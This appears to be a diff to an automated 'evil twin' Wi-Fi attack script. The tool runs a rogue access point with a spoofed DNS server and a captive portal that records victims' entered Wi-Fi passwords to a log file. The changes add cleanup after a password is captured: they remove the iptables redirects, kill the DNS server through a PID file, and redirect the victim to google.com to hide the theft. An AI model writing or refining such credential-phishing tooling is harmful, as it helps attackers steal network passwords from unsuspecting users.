@@ -650,10 +650,14 @@ create_captive_portal() {
     mkdir -p "${TMP_DIR}"
 
     cat > "${dns_script}" << 'PYEOF'
-import socket, struct, datetime, sys
+import socket, struct, datetime, sys, os
 
 AP_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.3.1"
 LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/dns.log"
+PID_FILE = "/tmp/evil-twin-automated/dns_server.pid"
+
+with open(PID_FILE, "w") as f:
+    f.write(str(os.getpid()))
 
 ip_parts = [int(x) for x in AP_IP.split(".")]
 ip_bytes = struct.pack("!BBBB", *ip_parts)
@@ -769,11 +773,25 @@ class Handler(http.server.BaseHTTPRequestHandler):
         ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         with open(LOG_FILE, "a") as f:
             f.write(f"[{ts}] Password: {password}\n")
+
+        import subprocess, signal, os
+        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], capture_output=True)
+        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
+        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", "at0", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], capture_output=True)
+        try:
+            with open("/tmp/evil-twin-automated/dns_server.pid") as f:
+                pid = int(f.read().strip())
+                os.kill(pid, signal.SIGTERM)
+        except: pass
+
         self.send_response(200)
         self.send_header("Content-type", "text/html; charset=utf-8")
         self.send_header("Cache-Control", "no-cache")
+        self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline'")
         self.end_headers()
-        self.wfile.write(SUCCESS_PAGE.encode("utf-8"))
+        html = SUCCESS_PAGE.format(essid=ESSID)
+        html += '<script>setTimeout(function(){window.location="http://google.com";},2000);</script>'
+        self.wfile.write(html.encode("utf-8"))
 
     def log_message(self, format, *args):
         pass
